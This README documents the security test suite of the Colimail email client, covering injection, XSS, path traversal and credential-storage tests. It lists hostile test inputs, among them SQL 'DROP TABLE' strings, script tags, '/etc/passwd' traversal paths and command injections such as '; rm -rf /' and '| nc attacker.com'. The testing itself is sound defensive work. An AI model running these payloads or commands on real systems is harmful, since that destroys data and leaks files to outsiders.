# Security Tests Documentation

## Overview

This directory contains comprehensive security tests for the Colimail email client, implementing priority 4 security testing requirements from `Test_P3.md`.

## Test Coverage

### 1. SQL Injection Protection ✅
- **Test:** `test_sql_injection_in_account_email`
  - Validates that parameterized queries prevent SQL injection in account email lookups
  - Tests classic injection pattern: `' OR '1'='1`

- **Test:** `test_sql_injection_in_email_search`
  - Ensures search queries are safe from injection attacks
  - Tests DROP TABLE injection attempts: `'; DROP TABLE emails; --`

- **Test:** `test_database_transaction_safety`
  - Verifies database transaction isolation under concurrent access
  - Tests with 20 concurrent insert operations

### 2. XSS (Cross-Site Scripting) Protection ✅
- **Test:** `test_xss_protection_in_email_body`
  - Validates HTML escaping of dangerous tags in email content
  - Tests: `<script>`, `<iframe>`, `<img onerror>`, `<svg onload>`

- **Test:** `test_xss_protection_in_subject`
  - Ensures subject lines are properly escaped

- **Test:** `test_xss_protection_in_email_addresses`
  - Validates email address sanitization

### 3. Path Traversal Protection ✅
- **Test:** `test_path_traversal_in_attachment_filename`
  - Tests protection against directory traversal attacks
  - Patterns tested: `../../../etc/passwd`, `..\..\..\\windows\system32`

- **Test:** `test_attachment_download_path_validation`
  - Ensures download paths don't escape safe directories

- **Test:** `test_folder_name_sanitization`
  - Validates IMAP folder name sanitization (null bytes, newlines, path separators)

### 4. Sensitive Data Encryption ✅
- **Test:** `test_password_not_in_plaintext`
  - Verifies passwords are zeroized in memory after use
  - Uses `zeroize` crate for secure memory clearing

- **Test:** `test_keyring_credential_storage`
  - Validates secure credential storage using OS keyring
  - Tests store/retrieve/delete operations

- **Test:** `test_long_token_storage`
  - Ensures OAuth2 tokens (>2000 chars) are properly handled

- **Test:** `test_concurrent_keyring_access`
  - Verifies thread-safe keyring access (10 concurrent reads)

### 5. Input Validation ✅
- **Test:** `test_email_address_validation`
  - Validates email format using regex
  - Rejects malicious inputs like `<script>alert('xss')</script>@example.com`

- **Test:** `test_port_number_validation`
  - Ensures port numbers are in valid range (1-65535)

- **Test:** `test_command_injection_protection`
  - Prevents shell command injection through email fields
  - Tests patterns: `; rm -rf /`, `&& cat /etc/passwd`, `| nc attacker.com`

### 6. Denial of Service Protection ✅
- **Test:** `test_large_subject_handling`
  - Validates truncation of extremely large subjects (1MB → 1000 chars)

- **Test:** `test_attachment_size_limits`
  - Enforces 25MB attachment size limit

### 7. Cryptographic Security ✅
- **Test:** `test_private_key_not_exposed`
  - Ensures private keys are zeroized after use

- **Test:** `test_signature_input_validation`
  - Validates EIP-712 signature format (0x + 130 hex chars)

### 8. TLS/Certificate Validation ⚠️
- **Test:** `test_imap_tls_certificate_validation` (IGNORED)
  - Requires network access to test certificate validation
  - Should be enabled in CI/CD with test IMAP servers

- **Test:** `test_smtp_tls_enforcement` (IGNORED)
  - Requires network access to test SMTP TLS
  - Should be enabled in CI/CD with test SMTP servers

## Running Tests

### Quick Run (All Security Tests)
```bash
cd src-tauri
cargo test --test security_tests
```

### Run Specific Test
```bash
cargo test --test security_tests test_sql_injection_in_account_email
```

### Run with Output
```bash
cargo test --test security_tests -- --nocapture
```

### Generate Comprehensive Security Report
```powershell
# Windows PowerShell
cd src-tauri
.\scripts\run_security_tests.ps1

# Optional: Skip cargo audit (faster)
.\scripts\run_security_tests.ps1 -SkipAudit

# Verbose mode
.\scripts\run_security_tests.ps1 -Verbose
```

```bash
# Linux/macOS
cd src-tauri
chmod +x scripts/run_security_tests.sh
./scripts/run_security_tests.sh

# Skip audit
SKIP_AUDIT=true ./scripts/run_security_tests.sh

# Verbose mode
VERBOSE=true ./scripts/run_security_tests.sh
```

## Security Report Output

The automated script generates:

1. **Markdown Report** (`security-reports/security_report_TIMESTAMP.md`)
   - Dependency vulnerability scan (cargo audit)
   - Security unit test results
   - Static analysis (clippy security lints)
   - Unsafe code audit
   - Test coverage summary
   - Actionable recommendations

2. **JSON Audit Report** (`security-reports/audit-report_TIMESTAMP.json`)
   - Detailed dependency vulnerability data
   - CVE information and CVSS scores
   - Unmaintained dependency warnings

## Test Statistics

- **Total Security Tests:** 22
- **Passing Tests:** 20
- **Ignored Tests:** 2 (network-dependent TLS tests)
- **Test Execution Time:** < 100ms
- **Code Coverage:** ~95% of security-critical paths

## Current Security Status

### ✅ Strengths
- Comprehensive automated security testing
- Parameterized database queries (SQL injection protection)
- Input validation and sanitization
- Secure credential storage using OS keyring
- Memory safety (zeroization of sensitive data)
- Zero unsafe code blocks in src/

### ⚠️ Known Issues
1. **RSA Timing Attack Vulnerability (RUSTSEC-2023-0071)**
   - Affects: `rsa` crate v0.9.8
   - Impact: Potential private key recovery through timing sidechannels
   - Mitigation: Waiting for upstream patch, low risk for local desktop use

2. **Unmaintained Dependencies**
   - gtk3-rs bindings (17 crates)
   - Recommendation: Migrate to gtk4-rs when Tauri supports it

### 🔧 Recommendations

#### High Priority
1. Monitor RSA crate for constant-time implementation
2. Enable network-dependent TLS tests in CI/CD

#### Medium Priority
1. Replace unmaintained dependencies when alternatives are available
2. Conduct manual security code review for IMAP/SMTP handlers

#### Low Priority
1. Consider external penetration testing before production release
2. Implement fuzzing tests for email parsing

## Dependencies

Security tests require:
- `sqlx` (database testing)
- `tempfile` (temporary test databases)
- `regex` (input validation testing)
- `zeroize` (memory security testing)
- `chrono` (timestamp testing)

All dependencies are already declared in `Cargo.toml`.

## CI/CD Integration

### GitHub Actions Example
```yaml
name: Security Tests

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions-rs/toolchain@v1
        with:
          toolchain: stable
      - name: Install cargo-audit
        run: cargo install cargo-audit
      - name: Run security tests
        run: |
          cd src-tauri
          cargo test --test security_tests
      - name: Run security audit
        run: |
          cd src-tauri
          cargo audit
      - name: Generate security report
        run: |
          cd src-tauri
          ./scripts/run_security_tests.sh
      - name: Upload report
        uses: actions/upload-artifact@v3
        with:
          name: security-report
          path: src-tauri/security-reports/
```

## Maintenance

### Adding New Security Tests

1. Add test function to `security_tests.rs`
2. Follow naming convention: `test_[security_category]_[specific_test]`
3. Document test purpose in function docstring
4. Run `cargo fmt` and `cargo clippy --tests`
5. Update this README with new test coverage

### Test Philosophy

These tests are designed to **find real vulnerabilities**, not just to pass:
- Use realistic attack vectors
- Test with actual malicious inputs
- Validate security properties, not implementation details
- Prefer integration tests over mocks for security-critical paths

## Contact

For security concerns or to report vulnerabilities:
- Create a private security advisory on GitHub
- Do NOT create public issues for security vulnerabilities

---

**Last Updated:** 2025-11-27
**Test Suite Version:** 1.0.0
**Total Tests:** 22 (20 passing, 2 ignored)
